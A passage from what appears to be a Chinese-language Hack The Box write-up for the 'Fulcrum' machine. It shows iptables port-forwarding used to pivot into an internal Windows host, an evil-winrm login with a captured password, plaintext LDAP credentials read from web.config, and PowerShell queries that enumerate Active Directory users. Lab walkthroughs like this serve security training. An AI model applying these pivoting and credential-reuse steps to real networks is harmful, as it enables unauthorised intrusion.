class="hljs-built_in">source</span>               destination         <br>LIBVIRT_OUT  all  --  0.0.0.0/0            0.0.0.0/0           <br><br>Chain LIBVIRT_FWI (1 references)<br>target     prot opt <span class="hljs-built_in">source</span>               destination         <br>ACCEPT     all  --  0.0.0.0/0            192.168.122.0/24     ctstate RELATED,ESTABLISHED<br>REJECT     all  --  0.0.0.0/0            0.0.0.0/0            reject-with icmp-port-unreachable<br><br>Chain LIBVIRT_FWO (1 references)<br>target     prot opt <span class="hljs-built_in">source</span>               destination         <br>ACCEPT     all  --  192.168.122.0/24     0.0.0.0/0           <br>REJECT     all  --  0.0.0.0/0            0.0.0.0/0            reject-with icmp-port-unreachable<br><br>Chain LIBVIRT_FWX (1 references)<br>target     prot opt <span class="hljs-built_in">source</span>               destination         <br>ACCEPT     all  --  0.0.0.0/0            0.0.0.0/0           <br><br>Chain LIBVIRT_INP (1 references)<br>target     prot opt <span class="hljs-built_in">source</span>               destination         <br>ACCEPT     udp  --  0.0.0.0/0            0.0.0.0/0            udp dpt:53<br>ACCEPT     tcp  --  0.0.0.0/0            0.0.0.0/0            tcp dpt:53<br>ACCEPT     udp  --  0.0.0.0/0            0.0.0.0/0            udp dpt:67<br>ACCEPT     tcp  --  0.0.0.0/0            0.0.0.0/0            tcp dpt:67<br><br>Chain LIBVIRT_OUT (1 references)<br>target     prot opt <span class="hljs-built_in">source</span>               destination         <br>ACCEPT     udp  --  0.0.0.0/0            0.0.0.0/0            udp dpt:53<br>ACCEPT     tcp  --  0.0.0.0/0            0.0.0.0/0            tcp dpt:53<br>ACCEPT     udp  --  0.0.0.0/0            0.0.0.0/0            udp dpt:68<br>ACCEPT     tcp  --  0.0.0.0/0            0.0.0.0/0            tcp dpt:68<br>root@fulcrum:~<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><p>使用iptables将81端口与5985端口开启：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs BASH">root@fulcrum:~<span class="hljs-comment"># iptables -I INPUT -p tcp -m tcp --dport 81 -j ACCEPT</span><br>root@fulcrum:~<span class="hljs-comment"># iptables -I INPUT -p tcp -m tcp --dport 5985 -j ACCEPT</span><br></code></pre></td></tr></table></figure><p>做正向转发，将81端口流量转发给内网主机80端口：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@fulcrum:~<span class="hljs-comment"># iptables -t nat -A PREROUTING -p tcp --dport 81 -j DNAT --to-destination 192.168.122.228:80</span><br></code></pre></td></tr></table></figure><p>将5985端口流量转发给内网主机5985端口：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@fulcrum:~<span class="hljs-comment"># iptables -t nat -A PREROUTING -p tcp --dport 5985 -j DNAT --to-destination 192.168.122.228:5985</span><br></code></pre></td></tr></table></figure><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root<span class="hljs-variable">@fulcrum</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># iptables -t nat -A POSTROUTING -j MASQUERADE</span><br>root<span class="hljs-variable">@fulcrum</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># iptables -I FORWARD -j ACCEPT</span><br>root<span class="hljs-variable">@fulcrum</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># iptables -P FORWARD ACCEPT</span><br>root<span class="hljs-variable">@fulcrum</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># sysctl net.ipv4.ip_forward=1</span><br>net.ipv4.ip_forward = <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>确定是否添加成功：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@fulcrum:~<span class="hljs-comment"># iptables -t nat -v -L PREROUTING -n --line-number</span><br>Chain PREROUTING (policy ACCEPT 1 packets, 229 bytes)<br>num   pkts bytes target     prot opt <span class="hljs-keyword">in</span>     out     <span class="hljs-built_in">source</span>               destination         <br>1        1    60 DNAT       tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:81 to:192.168.122.228:80<br>2        0     0 DNAT       tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:5985 to:192.168.122.228:5985<br></code></pre></td></tr></table></figure><p>访问81端口，也就是内网的80端口：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220903110405649.png" alt="image-20220903110405649"></p><p>看来nginx代理的就是这台主机。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">CrazyInSide:~/.ssh$ dirsearch -u http://10.10.10.62:81/  <br><br>  _|. _ _  _  _  _ _|_    v0.4.2<br> (_||| _) (/_(_|| (_| )<br><br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br><br>Output File: /home/crazyinside/.dirsearch/reports/10.10.10.62-81/-_22-09-03_11-09-08.txt<br><br>Error Log: /home/crazyinside/.dirsearch/logs/errors-22-09-03_11-09-08.<span class="hljs-built_in">log</span><br><br>Target: http://10.10.10.62:81/<br><br>[11:09:09] Starting: <br>[11:09:12] 403 -  312B  - /%2e%2e//google.com<br>[11:09:43] 403 -  312B  - /\..\..\..\..\..\..\..\..\..\etc\passwd<br>[11:10:47] 200 -    5KB - /index.htm<br></code></pre></td></tr></table></figure><p>没啥东西，尝试使用WebUser登录5985：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">CrazyInSide:~/.ssh$ evil-winrm -i 10.10.10.62 -u WebUser -p <span class="hljs-string">&#x27;M4ng£m£ntPa55&#x27;</span><br><br>Evil-WinRM shell v3.4<br><br>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="hljs-keyword">function</span> is unimplemented on this machine<br><br>Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm<span class="hljs-comment">#Remote-path-completion</span><br><br>Info: Establishing connection to remote endpoint<br><br>*Evil-WinRM* PS C:\Users\WebUser\Documents&gt; <br></code></pre></td></tr></table></figure><p>flag依旧不在这里：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs powershell">*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\WebUser&gt; <span class="hljs-built_in">cd</span> desktop<br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\WebUser\desktop&gt; <span class="hljs-built_in">ls</span><br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\WebUser\desktop&gt; <span class="hljs-built_in">ls</span> <span class="hljs-literal">-force</span><br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\WebUser\desktop&gt; ipconfig<br><br>Windows IP Configuration<br><br><br>Ethernet adapter Ethernet:<br><br>   Connection<span class="hljs-literal">-specific</span> DNS Suffix  . :<br>   Link<span class="hljs-literal">-local</span> IPv6 Address . . . . . : fe80::b1<span class="hljs-built_in">ac</span>:<span class="hljs-number">4</span>b69:feac:<span class="hljs-number">4</span>a7d%<span class="hljs-number">7</span><br>   IPv4 Address. . . . . . . . . . . : <span class="hljs-number">192.168</span>.<span class="hljs-number">122.228</span><br>   Subnet Mask . . . . . . . . . . . : <span class="hljs-number">255.255</span>.<span class="hljs-number">255.0</span><br>   Default Gateway . . . . . . . . . : <span class="hljs-number">192.168</span>.<span class="hljs-number">122.1</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">*Evil-WinRM* PS C:\Users&gt; <span class="hljs-built_in">ls</span><br><br><br>    Directory: C:\Users<br><br><br>Mode                LastWriteTime         Length Name<br>----                -------------         ------ ----<br>d-----         5/4/2022   5:40 PM                Administrator<br>d-r---         5/4/2022   5:40 PM                Public<br>d-----         9/3/2022   3:13 AM                WebUser<br></code></pre></td></tr></table></figure><p>或许还不是这台机器么？可是IP网卡已经没有其他了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash">*Evil-WinRM* PS C:\inetpub\wwwroot&gt; <span class="hljs-built_in">cat</span> web.config<br>&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;<br>&lt;configuration xmlns=<span class="hljs-string">&quot;http://schemas.microsoft.com/.NetConfiguration/v2.0&quot;</span>&gt;<br>    &lt;appSettings /&gt;<br>    &lt;connectionStrings&gt;<br>        &lt;add connectionString=<span class="hljs-string">&quot;LDAP://dc.fulcrum.local/OU=People,DC=fulcrum,DC=local&quot;</span> name=<span class="hljs-string">&quot;ADServices&quot;</span> /&gt;<br>    &lt;/connectionStrings&gt;<br>    &lt;system.web&gt;<br>        &lt;membership defaultProvider=<span class="hljs-string">&quot;ADProvider&quot;</span>&gt;<br>            &lt;providers&gt;<br>                &lt;add name=<span class="hljs-string">&quot;ADProvider&quot;</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;System.Web.Security.ActiveDirectoryMembershipProvider, System.Web, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a&quot;</span> connectionStringName=<span class="hljs-string">&quot;ADConnString&quot;</span> connectionUsername=<span class="hljs-string">&quot;FULCRUM\LDAP&quot;</span> connectionPassword=<span class="hljs-string">&quot;PasswordForSearching123!&quot;</span> attributeMapUsername=<span class="hljs-string">&quot;SAMAccountName&quot;</span> /&gt;<br>            &lt;/providers&gt;<br>        &lt;/membership&gt;<br>    &lt;/system.web&gt;<br>&lt;system.webServer&gt;<br>   &lt;httpProtocol&gt;<br>      &lt;customHeaders&gt;<br>           &lt;clear /&gt;<br>      &lt;/customHeaders&gt;<br>   &lt;/httpProtocol&gt;<br>        &lt;defaultDocument&gt;<br>            &lt;files&gt;<br>                &lt;clear /&gt;<br>                &lt;add value=<span class="hljs-string">&quot;Default.asp&quot;</span> /&gt;<br>                &lt;add value=<span class="hljs-string">&quot;Default.htm&quot;</span> /&gt;<br>                &lt;add value=<span class="hljs-string">&quot;index.htm&quot;</span> /&gt;<br>                &lt;add value=<span class="hljs-string">&quot;index.html&quot;</span> /&gt;<br>                &lt;add value=<span class="hljs-string">&quot;iisstart.htm&quot;</span> /&gt;<br>            &lt;/files&gt;<br>        &lt;/defaultDocument&gt;<br>&lt;/system.webServer&gt;<br>&lt;/configuration&gt;<br>*Evil-WinRM* PS C:\inetpub\wwwroot&gt; <br></code></pre></td></tr></table></figure><p>里边有一条ldap的查询，包括另一条账号凭证。然后google搜索”如何使用powershell查询LDAP”</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs powershell">*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\inetpub\wwwroot&gt; <span class="hljs-variable">$adsi</span> = <span class="hljs-built_in">New-Object</span> ADSI(<span class="hljs-string">&quot;LDAP://dc.fulcrum.local&quot;</span>, <span class="hljs-string">&quot;fulcrum\ldap&quot;</span>, <span class="hljs-string">&quot;PasswordForSearching123!&quot;</span>)<br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\inetpub\wwwroot&gt; <span class="hljs-variable">$searcher</span> = <span class="hljs-built_in">New-Object</span> ADSISearcher(<span class="hljs-variable">$adsi</span>, <span class="hljs-string">&quot;(&amp;(objectClass=user))&quot;</span>)<br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\inetpub\wwwroot&gt; <span class="hljs-variable">$searcher</span>.FindAll()<br><br>Path                                                                    Properties<br><span class="hljs-literal">----</span>                                                                    <span class="hljs-literal">----------</span><br>LDAP://dc.fulcrum.local/CN=Administrator,CN=Users,DC=fulcrum,DC=local   &#123;logoncount, codepage, objectcategory, description...&#125;<br>LDAP://dc.fulcrum.local/CN=Guest,CN=Users,DC=fulcrum,DC=local           &#123;logoncount, codepage, objectcategory, description...&#125;<br>LDAP://dc.fulcrum.local/CN=DC,OU=Domain Controllers,DC=fulcrum,DC=local &#123;ridsetreferences, logoncount, codepage, objectcategory...&#125;<br>LDAP://dc.fulcrum.local/CN=krbtgt,CN=Users,DC=fulcrum,DC=local          &#123;logoncount, codepage, objectcategory, description...&#125;<br>LDAP://dc.fulcrum.local/CN=ldap,CN=Users,DC=fulcrum,DC=local            &#123;samaccountname, givenname, codepage, objectcategory...&#125;<br>LDAP://dc.fulcrum.local/CN=<span class="hljs-number">923</span>a,CN=Users,DC=fulcrum,DC=local            &#123;samaccountname, givenname, codepage, objectcategory...&#125;<br>LDAP://dc.fulcrum.local/CN=BTables,CN=Users,DC=fulcrum,DC=local         &#123;samaccountname, givenname, codepage, objectcategory...&#125;<br>LDAP://dc.fulcrum.local/CN=FILE,CN=Computers,DC=fulcrum,DC=local        &#123;logoncount, codepage, objectcategory, iscriticalsystemobject...&#125;<br><br><br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\inetpub\wwwroot&gt; <br></code></pre></td></tr></table></figure><p>看到第一条是管理员账户，查看特性用$_.Properties，只用查询第一条：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs powershell">*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\inetpub\wwwroot&gt; <span class="hljs-variable">$searcher</span>.FindOne() | %&#123; <span class="hljs-variable">$_</span>.Properties &#125;<br><br>Name                           Value<br><span class="hljs-literal">----</span>                           <span class="hljs-literal">-----</span><br>logoncount                     &#123;<span class="hljs-number">6</span>&#125;<br>codepage                       &#123;<span class="hljs-number">0</span>&#125;<br>objectcategory                 &#123;CN=Person,CN=Schema,CN=Configuration,DC=fulcrum,DC=local&#125;<br>description                    &#123;Built<span class="hljs-operator">-in</span> account <span class="hljs-keyword">for</span> administering the computer/domain&#125;<br>usnchanged                     &#123;<span class="hljs-number">12848</span>&#125;<br>instancetype                   &#123;<span class="hljs-number">4</span>&#125;<br>name                           &#123;Administrator&#125;<br>badpasswordtime                &#123;<span class="hljs-number">0</span>&#125;<br>pwdlastset                     &#123;<span class="hljs-number">132964712628921140</span>&#125;<br>objectclass                    &#123;top, person, organizationalPerson, user&#125;<br>badpwdcount                    &#123;<span class="hljs-number">0</span>&#125;<br>samaccounttype                 &#123;<span class="hljs-number">805306368</span>&#125;<br>lastlogontimestamp             &#123;<span class="hljs-number">132964665675803546</span>&#125;<br>usncreated                     &#123;<span class="hljs-number">8196</span>&#125;<br>objectguid                     &#123;<span class="hljs-number">99</span> <span class="hljs-number">149</span> <span class="hljs-number">64</span> <span class="hljs-number">115</span> <span class="hljs-number">108</span> <span class="hljs-number">62</span> <span class="hljs-number">201</span> <span class="hljs-number">74</span> <span class="hljs-number">155</span> <span class="hljs-number">216</span> <span class="hljs-number">168</span> <span class="hljs-number">4</span> <span class="hljs-number">198</span> <span class="hljs-number">81</span> <span class="hljs-number">158</span> <span class="hljs-number">173</span>&#125;<br>memberof                       &#123;CN=<span class="hljs-built_in">Group</span> Policy Creator Owners,CN=Users,DC=fulcrum,DC=local, CN=Domain Admins,CN=Users,DC=fulcrum,DC=local, CN=Enterprise Admins,CN=Users,DC=fulcrum,DC=local, CN=Schema Admins,CN=Users,DC=fulcrum,DC=local...&#125;<br>whencreated                    &#123;<span class="hljs-number">5</span>/<span class="hljs-number">8</span>/<span class="hljs-number">2022</span> <span class="hljs-number">6</span>:<span class="hljs-number">52</span>:<span class="hljs-number">43</span> AM&#125;<br>adspath                        &#123;LDAP://dc.fulcrum.local/CN=Administrator,CN=Users,DC=fulcrum,DC=local&#125;<br>useraccountcontrol             &#123;<span class="hljs-number">512</span>&#125;<br>cn                             &#123;Administrator&#125;<br>countrycode                    &#123;<span class="hljs-number">0</span>&#125;<br>primarygroupid                 &#123;<span class="hljs-number">513</span>&#125;<br>whenchanged                    &#123;<span class="hljs-number">5</span>/<span class="hljs-number">8</span>/<span class="hljs-number">2022</span> <span class="hljs-number">8</span>:<span class="hljs-number">14</span>:<span class="hljs-number">22</span> AM&#125;<br>dscorepropagationdata          &#123;<span class="hljs-number">5</span>/<span class="hljs-number">8</span>/<span class="hljs-number">2022</span> <span class="hljs-number">7</span>:<span class="hljs-number">10</span>:<span class="hljs-number">32</span> AM, <span class="hljs-number">5</span>/<span class="hljs-number">8</span>/<span class="hljs-number">2022</span> <span class="hljs-number">7</span>:<span class="hljs-number">10</span>:<span class="hljs-number">32</span> AM, <span class="hljs-number">5</span>/<span class="hljs-number">8</span>/<span class="hljs-number">2022</span> <span class="hljs-number">6</span>:<span class="hljs-number">55</span>:<span class="hljs-number">22</span> AM, <span class="hljs-number">1</span>/<span class="hljs-number">1</span>/<span class="hljs-number">1601</span> <span class="hljs-number">6</span>:<span class="hljs-number">12</span>:<span class="hljs-number">16</span> PM&#125;<br>lastlogon                      &#123;<span class="hljs-number">132964733510360703</span>&#125;<br>distinguishedname              &#123;CN=Administrator,CN=Users,DC=fulcrum,DC=local&#125;<br>logonhours                     &#123;<span class="hljs-number">255</span> <span class="hljs-number">255</span> <span class="hljs-number">255</span> <span class="hljs-number">255</span> <span class="hljs-number">255</span> <span class="hljs-number">255</span> <span class="hljs-number">255</span> <span class="hljs-number">255</span> <span class="hljs-number">255</span> <span class="hljs-number">255</span> <span class="hljs-number">255</span> <span class="hljs-number">255</span> <span class="hljs-number">255</span> <span class="hljs-number">255</span> <span class="hljs-number">255</span> <span class="hljs-number">255</span> <span class="hljs-number">255</span> <span class="hljs-number">255</span> <span class="hljs-number">255</span> <span class="hljs-number">255</span> <span class="hljs-number">255</span>&#125;<br>admincount                     &#123;<span class="hljs-number">1</span>&#125;<br>iscriticalsystemobject         &#123;True&#125;<br>samaccountname                 &#123;Administrator&#125;<br>objectsid                      &#123;<span class="hljs-number">1</span> <span class="hljs-number">5</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">5</span> <span class="hljs-number">21</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">216</span> <span class="hljs-number">239</span> <span class="hljs-number">5</span> <span class="hljs-number">69</span> <span class="hljs-number">222</span> <span class="hljs-number">106</span> <span class="hljs-number">231</span> <span class="hljs-number">38</span> <span class="hljs-number">26</span> <span class="hljs-number">113</span> <span class="hljs-number">214</span> <span class="hljs-number">180</span> <span class="hljs-number">244</span> <span class="hljs-number">1</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>&#125;<br>lastlogoff                     &#123;<span class="hljs-number">0</span>&#125;<br>accountexpires                 &#123;<span class="hljs-number">0</span>&#125;<br></code></pre></td></tr></table></figure><p>没什么东西，查看全部：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br></pre></td><td class="code"><pre><code class="hljs powershell">*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\inetpub\wwwroot&gt; <span class="hljs-variable">$searcher</span>.FindAll() | %&#123; <span class="hljs-variable">$_</span>.Properties &#125;<br><br>Name                           Value<br><span class="hljs-literal">----</span>                           <span class="hljs-literal">-----</span><br>logoncount                     &#123;<span class="hljs-number">6</span>&#125;<br>codepage                       &#123;<span class="hljs-number">0</span>&#125;<br>objectcategory                 &#123;CN=Person,CN=Schema,CN=Configuration,DC=fulcrum,DC=local&#125;<br>description                    &#123;Built<span class="hljs-operator">-in</span> account <span class="hljs-keyword">for</span> administering the computer/domain&#125;<br>usnchanged                     &#123;<span class="hljs-number">12848</span>&#125;<br>instancetype                   &#123;<span class="hljs-number">4</span>&#125;<br>name                           &#123;Administrator&#125;<br>badpasswordtime                &#123;<span class="hljs-number">0</span>&#125;<br>pwdlastset                     &#123;<span class="hljs-number">132964712628921140</span>&#125;<br>objectclass                    &#123;top, person, organizationalPerson, user&#125;<br>badpwdcount            